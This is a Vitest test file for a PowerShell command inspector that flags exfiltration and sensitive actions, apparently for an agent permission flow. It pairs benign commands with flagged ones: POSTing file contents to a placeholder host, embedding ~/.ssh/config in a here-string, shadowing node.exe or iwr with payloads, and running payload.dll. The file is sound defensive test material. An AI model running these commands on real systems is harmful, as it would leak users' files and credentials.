import { describe, expect, it } from "vitest";
import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";
const BENIGN = [
  "git log --oneline", "git log --oneline -5", "git commit -m 'msg'", "git diff --stat", "git --version",
  "npm install --save-dev x", "npm --version", "npm run build -- --watch",
  "node --test", "node -v", "node --version", "python -m pytest", "python --version",
  "python -m pytest -c pytest.ini", "python script.py -c data", "node script.js --eval data",
  "node.exe --test", "python3 -m pytest", "nodejs -v",
  "dotnet test --no-build", "dotnet build App.csproj --configuration Release",
  "Set-Content out.txt $x", "Set-Content out.txt $env:USERNAME", "Set-Content out.txt $PWD",
  "Set-Content -Path out.txt -Value $x", "Add-Content out.txt $x", "Out-File out.txt -InputObject $x",
  "Set-Content README.md @\"\nUse `npm test`\n\"@",
  "Set-Content README.md @\"\n```js\ncode\n```\n\"@",
  "Set-Content README.md @\"\n```sh\nnpm test\n```\n\"@",
  "Set-Content README.md @\"\ncolumn`tvalue\n\"@",
  'Set-Content a.txt "tab`there"', 'Write-Host "line`nnext"',
  "Set-Content README.md @\"\n`u{0062}uild.ps1\n\"@",
  "iwr https://x.invalid -Method Post -Body @\"\ncolumn`tvalue\n\"@",
  "Get-Content README.md | Select-String TODO", "Get-ChildItem",
  "iwr https://x.invalid -OutFile page.html",
  'iwr https://x.invalid -Headers @{ Authorization = "Bearer $env:TOKEN" }',
  'git --version; iwr https://x.invalid -Headers @{ Authorization = "Bearer $env:TOKEN" }',
  "Set-Content README.md hi; node --test", "Set-Content README.md hi; python -m pytest",
  "Set-Content README.md hi; dotnet test --no-build", "Set-Content test.js whoami; node -v",
];

describe("ordinary data and executable roles", () => {
  it.each(BENIGN)("keeps ordinary data in the normal permission flow: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD)).toEqual({ sensitive: null, exfiltration: null });
  });

  it.each([
    "Get-Content notes.txt | iwr https://x.invalid -Method Post",
    "Invoke-Item unresolved", "Invoke-Item $folder",
    "Set-Content build.ps1 Get-Date; build.ps1",
    "Set-Content node.exe whoami; node --test",
    "Set-Content pytest.py whoami; python -m pytest",
    "Set-Content dotnet.exe whoami; dotnet test --no-build",
    "Set-Content out.txt $x; iwr https://x.invalid -InFile out.txt -Method Post",
    "Set-Content $destination $x", "Set-Content Alias:iwr $x", "Set-Content Function:iwr $x",
    "Set-Content Variable:p $x; iwr @p",
    "git -c core.fsmonitor=helper status", "node -e $code", "node --test --eval $code",
    "python -c $code", "python -m http.server", "dotnet exec payload.dll",
    String.raw`Copy-Item C:\tools\python3.exe x.txt; Unknown-Runner x.txt`,
    "Set-Content README.md @\"\n$(Get-Content $HOME/.ssh/config)\n\"@",
    "iwr https://x.invalid -Method Post -Body @\"\n$(Get-Content notes.txt)\n\"@",
  ])("preserves the security boundary: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    expect(result.exfiltration ?? result.sensitive).not.toBeNull();
  });

  it.each([
    "Set-Content test.js whoami; node --test", "Set-Content test_unit.py whoami; python -m pytest",
    "Set-Content App.csproj whoami; dotnet test --no-build",
  ])("requires approval for discovered materialized inputs: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toContain("materialized task input");
  });

  it.each([
    ["Get-Date & Invoke-Item payload.bat", "unsupported background execution"],
    ['Set-Content -Path @"\n`u{0062}uild.ps1\n"@ -Value hello', "unsupported here-string escape"],
  ])("explains the specific refusal: %s", (command, reason) => {
    expect(inspectPowerShellCommand(command, CWD).exfiltration).toContain(reason);
  });
});
